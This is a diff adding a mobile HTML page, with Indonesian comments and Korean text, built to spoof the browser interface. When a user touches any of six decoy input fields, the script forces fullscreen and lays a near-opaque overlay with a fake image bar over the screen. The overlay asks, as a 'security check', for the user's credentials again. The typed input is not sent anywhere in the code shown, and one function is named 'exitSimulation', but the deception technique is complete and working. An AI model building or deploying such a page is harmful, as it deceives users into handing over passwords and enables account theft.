@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Precision Custom Layout Takeover</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            background-color: #ffffff;
+            font-family: Roboto, sans-serif;
+            overflow: hidden;
+            -webkit-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            -webkit-touch-callout: none;
+        }
+
+        /* Overlay Presisi Tinggi dengan Form di Posisi Paling Atas */
+        #spoofed-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(20, 21, 23, 0.999);
+            color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+            align-items: center;
+            z-index: 2147483647;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.01s ease-in;
+            box-sizing: border-box;
+        }
+
+        #spoofed-overlay.show {
+            opacity: 1;
+            pointer-events: auto;
+        }
+
+        /* Styling Bar Gambar tetap di paling atas */
+        .fake-image-bar {
+            width: 100%;
+            display: block;
+            object-fit: contain;
+            cursor: pointer;
+            flex-shrink: 0;
+            margin-top: 0;
+        }
+
+        /* Form Wrapper diturunkan sedikit ke bawah */
+        .form-wrapper {
+            width: 100%;
+            max-width: 380px;
+            padding: 24px 16px 12px 16px; /* Padding atas ditingkatkan agar form turun */
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: flex-start;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #5f6368;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 15px;
+            background-color: #292a2d;
+            color: white;
+            outline: none;
+        }
+
+        /* Area Workspace Bebas */
+        .workspace {
+            position: relative;
+            width: 100vw;
+            height: 100vh;
+            box-sizing: border-box;
+            padding: 20px;
+        }
+
+        /* Posisi Kustom Ke-6 Form & Teks Korea di Tengah */
+        .pos-1 { position: absolute; top: 40px; left: 16px; width: 140px; }
+        .pos-2 { position: absolute; top: 40px; left: 50%; transform: translateX(-50%); width: 140px; }
+        .pos-3 { position: absolute; top: 120px; left: 16px; width: 140px; }
+        .pos-4 { position: absolute; top: 120px; right: 16px; width: 140px; }
+        .pos-5 { position: absolute; bottom: 60px; left: 50%; transform: translateX(-50%); width: 200px; }
+        .pos-6 { position: absolute; top: 50%; left: 16px; transform: translateY(-50%); width: 140px; }
+
+        .center-korean-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            color: #202124;
+            font-size: 16px;
+            font-weight: 500;
+            pointer-events: none;
+            width: 80%;
+        }
+
+        .custom-input {
+            padding: 10px;
+            border: 1px solid #dadce0;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            background: #f8f9fa;
+            box-sizing: border-box;
+            width: 100%;
+        }
+
+        .custom-input:focus {
+            border-color: #1a73e8;
+            background: #fff;
+        }
+    </style>
+</head>
+<body>
+
+<!-- Lapisan Overlay Fullscreen dengan Gambar di Paling Atas dan Form Diturunkan Sedikit -->
+<div id="spoofed-overlay">
+    <img src="https://ecdnts-del.github.io/spoof/barr.jpg" alt="Bar" class="fake-image-bar" onclick="exitSimulation()">
+    <div class="form-wrapper">
+        <h3 style="margin: 0 0 2px 0; font-weight: 400; font-size: 16px; color: #e8eaed; text-align: center;">보안 확인</h3>
+        <p style="color: #9aa0a6; font-size: 11px; margin: 0 0 10px 0; text-align: center;">세션을 계속하려면 자격 증명을 다시 입력하세요.</p>
+
+        <input type="text" id="overlay-input" placeholder="입력 중..." class="input-field">
+        <button style="width: 100%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: 500; font-size: 14px; cursor: pointer;">확인</button>
+    </div>
+</div>
+
+<!-- Area Workspace Bebas -->
+<div class="workspace">
+    <!-- Teks Bahasa Korea di Tengah -->
+    <div class="center-korean-text">
+        보안 시스템 인증 절차가 진행 중입니다.<br>원하시는 입력란을 선택해 주세요.
+    </div>
+
+    <!-- 6 Form dengan Posisi Kustom -->
+    <div class="pos-1"><input type="text" class="custom-input trigger-form" placeholder="Paling Atas Kiri"></div>
+    <div class="pos-2"><input type="text" class="custom-input trigger-form" placeholder="Paling Tengah Atas"></div>
+    <div class="pos-3"><input type="text" class="custom-input trigger-form" placeholder="Bar Atas Kiri"></div>
+    <div class="pos-4"><input type="text" class="custom-input trigger-form" placeholder="Kanan Tengah"></div>
+    <div class="pos-5"><input type="text" class="custom-input trigger-form" placeholder="Tengah Bawah"></div>
+    <div class="pos-6"><input type="text" class="custom-input trigger-form" placeholder="🔴"></div>
+</div>
+
+<script>
+    const overlay = document.getElementById('spoofed-overlay');
+    const overlayInput = document.getElementById('overlay-input');
+    const allForms = document.querySelectorAll('.trigger-form');
+    let lockState = false;
+
+    function executeCustomTakeover(e) {
+        if (lockState) return;
+        lockState = true;
+
+        // 1. Hapus seleksi teks aktif untuk mencegah text selection overlap
+        if (window.getSelection) {
+            window.getSelection().removeAllRanges();
+        }
+
+        // 2. Keyboard virtual muncul terlebih dahulu secara instan melalui fokus lokal
+        overlayInput.focus();
+
+        // 3. Jeda 300ms kemudian otomatis masuk ke mode fullscreen
+        setTimeout(() => {
+            const docEl = document.documentElement;
+            const reqFS = docEl.requestFullscreen || docEl.webkitRequestFullscreen || docEl.mozRequestFullScreen;
+            if (reqFS && !document.fullscreenElement) {
+                reqFS.call(docEl).catch(() => {});
+            }
+
+            // Aktifkan overlay penutup
+            overlay.classList.add('show');
+            overlayInput.focus();
+        }, 300);
+    }
+
+    // Mengunci posisi overlay dengan Visual Viewport
+    if (window.visualViewport) {
+        function updateViewportGeometry() {
+            overlay.style.height = window.visualViewport.height + 'px';
+            overlay.style.top = window.visualViewport.offsetTop + 'px';
+            overlay.style.left = window.visualViewport.offsetLeft + 'px';
+            overlay.style.width = window.visualViewport.width + 'px';
+        }
+        window.visualViewport.addEventListener('resize', updateViewportGeometry);
+        window.visualViewport.addEventListener('scroll', updateViewportGeometry);
+    }
+
+    // Event binding ke-6 form kustom
+    allForms.forEach(input => {
+        ['touchstart', 'click', 'focus'].forEach(evt => {
+            input.addEventListener(evt, (e) => {
+                executeCustomTakeover(e);
+            }, { passive: true });
+        });
+    });
+
+    function exitSimulation() {
+        overlay.classList.remove('show');
+        if (document.fullscreenElement) {
+            document.exitFullscreen().catch(() => {});
+        }
+        setTimeout(() => { lockState = false; }, 1);
+    }
+</script>
+</body>
+</html>
